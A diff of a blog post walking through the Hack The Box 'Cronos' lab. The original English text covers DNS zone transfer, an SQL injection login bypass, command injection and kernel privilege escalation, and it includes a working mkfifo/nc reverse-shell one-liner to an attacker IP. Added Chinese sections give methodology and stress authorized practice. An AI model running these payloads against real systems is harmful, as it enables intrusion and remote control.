@@ -6,9 +6,14 @@ cover: "/img/post-covers/cronos-hack-the-box-357884f03b.jpg"
 tags: [安全, 渗透测试, HTB]
 categories: [htb]
 date: "2019-03-15"
+lastmod: "2026-08-08"
 ---
 
-![AEpKkq.png](https://s2.ax1x.com/2019/03/14/AEpKkq.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 ## Introduction
 
@@ -24,7 +29,11 @@ Firstly, detect the open ports:
 nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
 ```
 
-![AE1qlF.png](https://s2.ax1x.com/2019/03/15/AE1qlF.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 3 ports is open, detect the detailed services:
 
@@ -32,7 +41,11 @@ nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
 namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
 ```
 
-![AE1OOJ.png](https://s2.ax1x.com/2019/03/15/AE1OOJ.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 So we can conduct the relation of ports of ports and services as following:
 
@@ -48,7 +61,11 @@ port|service
 
 As the target machine provides http service, try to access `http://10.10.10.13`
 
-![AE3V0A.png](https://s2.ax1x.com/2019/03/15/AE3V0A.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 Default apache web page, nothing new. So try to brute force `http://10.10.10.13/` with dirbuster. After brute force for a period time, we have not found anything new.
 
@@ -60,7 +77,11 @@ As the target machine owns DNS service. It is common to check zone transfer with
 dig axfr @10.10.10.13 cronos.htb
 ```
 
-![AE3ZTI.png](https://s2.ax1x.com/2019/03/15/AE3ZTI.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 An interestring domain name `admin.cronos.htb` is found. So add an entry into `/etc/hosts`:
 
@@ -70,13 +91,17 @@ An interestring domain name `admin.cronos.htb` is found. So add an entry into `/
 
 Try to access `admin.cronos.htb` in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of `admin ' or '1' = '1`, the password can be anything.
 
-![AE3mkt.png](https://s2.ax1x.com/2019/03/15/AE3mkt.png)
 
-![AE3ntP.png](https://s2.ax1x.com/2019/03/15/AE3ntP.png)
+
+> **（原外链配图已失效移除，请以正文说明为准）**
 
 Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of `8888&whoami`:
 
-![AE3l6g.png](https://s2.ax1x.com/2019/03/15/AE3l6g.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 The result is `www-data`. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port `1234` by nc in our kali:
 
@@ -92,7 +117,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f
 
 Wait for server second, shell is return. Wonderful!
 
-![AE3uff.png](https://s2.ax1x.com/2019/03/15/AE3uff.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 Try to obtain a tty terminal:
 
@@ -112,7 +141,11 @@ uname -a
 
 Google linux kernel privilege escalation, find a [payload](https://www.exploit-db.com/exploits/44298)
 
-![AEmLVK.png](https://s2.ax1x.com/2019/03/15/AEmLVK.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 Server a http server to provide the payload, name it as exploit.c:
 
@@ -147,8 +180,47 @@ chmod +x exploit
 
 Just execute it by `./exploit`. Wow, now see whoami.
 
-![AE31XQ.png](https://s2.ax1x.com/2019/03/15/AE31XQ.png)
+
+
+> **（原外链配图已失效移除，请以正文说明为准）**
+
+
 
 ## Conclusion
 
 The target machine is quite straitforward. The basic point is the zone transfer of DNS exploit. And other steps is not difficult with basic knowledges including: sql injection, reverse shell, etc.
+
+
+## Writeup 方法沉淀（授权靶场）
+
+Cronos 类机器的通用路径仍是：
+
+1. **全端口扫描** + 服务版本识别  
+2. Web 虚拟主机 / 子域枚举（hosts 文件、DNS）  
+3. 已知 CMS/框架漏洞或命令注入点  
+4. 稳定反弹 shell 后做本机枚举  
+5. 定时任务 / 内核 / sudo 提权  
+
+写 writeup 时请固定结构：**信息收集 → 初始访问 → 提权 → 收获标志**，并标注仅在 Hack The Box 等授权环境练习。
+
+## 外链图说明
+
+文中部分截图托管在第三方图床，可能失效。关键命令与思路以文字与代码块为准；复现时以你当时 nmap/gobuster 输出为准。
+
+## 小结
+
+靶机价值在于训练完整攻击链，而不是背一个 IP。把枚举清单化，比死记某题的洞更重要。
+
+
+## 时间盒练习法
+
+给自己 2 小时：前 40 分钟只做枚举不利用，中 50 分钟打点，后 30 分钟提权与记录。超时就看官方/社区 writeup 对照差距。刻意练习比无限制熬夜刷机更提升能力。
+
+
+## 延伸阅读与实践
+
+把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。
+
+若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。
+
+对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。
